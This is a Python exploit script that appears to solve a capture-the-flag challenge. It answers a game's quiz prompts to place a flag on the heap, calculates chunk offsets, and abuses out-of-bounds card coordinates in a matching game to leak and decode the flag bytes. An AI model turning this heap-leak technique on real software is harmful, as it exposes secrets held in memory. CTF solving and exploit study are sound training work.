#!/usr/bin/env python3
import os
import sys
import subprocess
import re
import itertools

CMD             = ['./game']
CHUNK_ALIGN     = 8
CHUNK_HEADLEN   = 4


BANNER_LEN      = os.path.getsize('banner')
FLAG_LEN        = os.path.getsize('flag')
FLAG_QLEN       = 18

CARDS_COL       = 13
CARDS_ROW       = 4
CARDS_SETLEN    = CARDS_COL * CARDS_ROW
CARDS_LEAKLEN   = (CARDS_COL - CARDS_ROW) * CARDS_COL
CARDS_COODS     = tuple(itertools.product(range(0, CARDS_COL), range(0, CARDS_COL)))
CARDS_TRIALNUM  = 5

CARDTABLE = []
with open('game', 'rb') as f:
    game = f.read()
    head = game.find(b'S1\0')
    for pos in range(head, head + 3 * 256, 3):
        CARDTABLE.append(re.match(br'([^\0]*)\0', game[pos:]).group(1))

# You can find answers for the quizzes by googling.
QUIZLEN = []
QUIZTABLE = []
for i in range(10):
    QUIZLEN.append(os.path.getsize('quiz%02d' % (i + 1)))
    with open('quiz%02d' % (i + 1), 'rb') as f:
        QUIZTABLE.append((f.readline().rstrip(b'\n'), f.readline().rstrip(b'\n')))

def main(argv):
    offset = int(argv[1])

    while True:
        mallocpos = 0
        proc, rf, wf = popen_game()

        log('answering to 5 questions to load flag into heap...')
        out = comm_until(rf, wf, b'1\n', br'Q\.')
        for _ in range(5):
            question = re.search(br'\r\nQ. (.*)\r\n', out).group(1)
            qi = quizidx(question)
            mallocpos += align_chunk(QUIZLEN[qi] + 1 + CHUNK_HEADLEN)

            out = comm_until(rf, wf, QUIZTABLE[qi][1] + b'\n', br'Q\.')

        flagpos = mallocpos + align_chunk(BANNER_LEN + 1 + CHUNK_HEADLEN)
        log('position of flag:\t%08x' % flagpos)

        # margin between first malloc for cards game and leakable position:
        margin = align_chunk(CARDS_SETLEN + CHUNK_HEADLEN) + CARDS_SETLEN

        comm_until(rf, wf, b'\n', br'1\.')
        while flagpos > mallocpos + margin + CARDS_LEAKLEN:
            out = comm_until(rf, wf, b'1\n', br'Q\.')
            question = re.search(br'\r\nQ. (.*)\r\n', out).group(1)
            qi = quizidx(question)
            mallocpos += align_chunk(QUIZLEN[qi] + 1 + CHUNK_HEADLEN)

            out = comm_until(rf, wf, b'\n', br'1\.')

        if flagpos + FLAG_LEN > mallocpos + margin:
            flagpos_cards = (flagpos + FLAG_QLEN + offset) - (mallocpos + align_chunk(CARDS_SETLEN + CHUNK_HEADLEN))

            cards = []
            comm_until(rf, wf, b'2\n', b'>')
            for cood0, cood1 in zip(CARDS_COODS[flagpos_cards:flagpos_cards + CARDS_TRIALNUM:2],
                                    CARDS_COODS[flagpos_cards + 1:flagpos_cards + 1 + CARDS_TRIALNUM:2]):
                out = comm_until(rf, wf, bytes('%d %d %d %d\n' % (cood0[0], cood0[1], cood1[0], cood1[1]), 'ascii'), br'(M|m)atched')
                cards.extend(re.findall(br'The card at \(\d+, \d+\) is ([^.]*)\.\r\n', out))

            log('cards:\t\t%s' % cards)
            log('decoded flag:\t%s' % decode_cardname(cards))

        proc.kill()

def popen_game():
    rfd, stdout = os.openpty()
    wfd, stdin = os.openpty()
    proc = subprocess.Popen(CMD, bufsize=0, stdout=stdout, stdin=stdin)
    os.close(stdout)
    os.close(stdin)
    return proc, os.fdopen(rfd, 'rb'), os.fdopen(wfd, 'wb')

def comm_until(rf, wf, input, pattern):
    wf.write(input)
    wf.flush()
    out = b''
    while re.search(pattern, out) is None:
        out += rf.readline()
    return out

def log(msg):
    print('[*] %s' % msg, file=sys.stderr)

def align_chunk(addr):
    return (addr // CHUNK_ALIGN + (1 if addr % CHUNK_ALIGN else 0)) * CHUNK_ALIGN

def quizidx(question):
    return next(i for i in range(len(QUIZTABLE)) if QUIZTABLE[i][0] == question)

def decode_cardname(cards):
    decb = bytearray()
    for c in cards:
        ch = next((i for i in range(len(CARDTABLE)) if CARDTABLE[i] == c.replace(b'\r\n', b'\n')), ord('*'))
        decb.append(ch)
    return decb

if __name__ == '__main__':
    main(sys.argv)
